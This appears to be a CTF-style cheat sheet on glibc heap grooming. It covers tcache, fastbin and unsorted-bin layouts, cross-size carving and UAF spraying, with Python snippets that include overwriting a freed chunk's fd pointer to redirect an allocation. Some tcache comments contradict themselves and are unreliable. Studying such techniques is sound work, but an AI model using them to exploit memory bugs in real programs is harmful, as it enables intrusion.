# Heap Feng Shui (Grooming)

**What**: Deliberately shape the heap layout through a sequence of allocations and frees so that vulnerable and target objects are adjacent or overlapping.

**Why**: Heap exploits need deterministic layouts. Without grooming, the heap is unpredictable and exploits are unreliable.

## Core Strategy
```
1. Drain existing freelists (allocate until they're empty)
2. Create a known sequence of chunks (A, B, C, D, ...)
3. Free specific chunks to create "holes" at known positions
4. Trigger the vulnerable allocation → it fills a hole adjacent to the target
5. Overflow/UAF now hits the intended target
```

## Tcache Grooming
```python
# IN: alloc/free primitives  OUT: two adjacent chunks with controlled layout
from pwn import *

SIZE = 0x90

# Step 1: Drain tcache for SIZE (allocate 7 and free them)
fillers = []
for i in range(7):
    fillers.append(alloc(i, SIZE))
for i in range(7):
    free(i)
# Tcache[SIZE] is now full

# Step 2: Allocate victim and target consecutively
victim = alloc(7, SIZE)    # chunk at address X
target = alloc(8, SIZE)    # chunk at address X + SIZE + 0x10 (adjacent)
guard  = alloc(9, SIZE)    # prevent consolidation

# Step 3: Free to set up the attack
free(8)  # target goes to tcache (now has 8 entries, but 7 is max — goes to unsorted)
# Or: drain tcache first by allocating 7 entries out, then free target

# Step 4: Overflow from victim into target's freed metadata
edit(7, b'A' * SIZE + p64(0) + p64(SIZE + 0x11) + p64(arbitrary_addr))
# Overwrites target's fd pointer in tcache → next alloc lands at arbitrary_addr
```

## Fastbin Grooming
```python
# Same idea but for fastbin sizes (0x20–0x80)
# Fastbin is LIFO: last freed = first allocated
# Free in specific order to control allocation order

free(A)  # fastbin: [A]
free(B)  # fastbin: [B → A]
free(C)  # fastbin: [C → B → A]

alloc(_, size)  # returns C
alloc(_, size)  # returns B
alloc(_, size)  # returns A
```

## Unsorted Bin Grooming
```python
# Chunks > 0x410 (or after tcache is full) go to unsorted bin
# Unsorted bin is FIFO for the first allocation, then sorted into small/large bins

# Step 1: Create adjacent chunks, free the middle one
alloc(0, 0x420)  # A
alloc(1, 0x420)  # B (will be freed)
alloc(2, 0x420)  # C
alloc(3, 0x10)   # guard

free(1)  # B → unsorted bin, between A and C
# Overflow from A into B's freed metadata to corrupt fd/bk
```

## Cross-Size Grooming
**When**: Need to overlap chunks of different sizes.

```python
# Allocate large chunk, free it, then allocate smaller chunks from the same region
alloc(0, 0x200)   # large chunk
free(0)            # → unsorted bin
alloc(1, 0x80)     # carved from the freed large chunk
alloc(2, 0x80)     # second carve — adjacent to chunk 1
# Chunk 1 and 2 are adjacent, carved from the same unsorted bin remnant
```

## Spray Pattern
```python
# For UAF: spray objects of the target size so the freed slot is reused
victim = alloc(0, TARGET_SIZE)
free(0)  # freed but pointer dangling

# Spray — one of these reuses the freed memory
for i in range(1, 100):
    alloc(i, TARGET_SIZE, controlled_data)
# Now victim pointer (index 0) aliases one of the sprayed chunks
```

## Trap
- Tcache serves from the per-thread cache first — if the target size has tcache entries, those are returned before unsorted/small/large bin.
- To force a chunk into unsorted bin: fill tcache for that size first (7 frees), then the 8th free goes to unsorted bin.
- Consolidation: adjacent freed chunks merge. Use guard chunks (small allocations between targets) to prevent unwanted consolidation.
- ASLR doesn't affect relative heap layout within a session — grooming is deterministic per run.
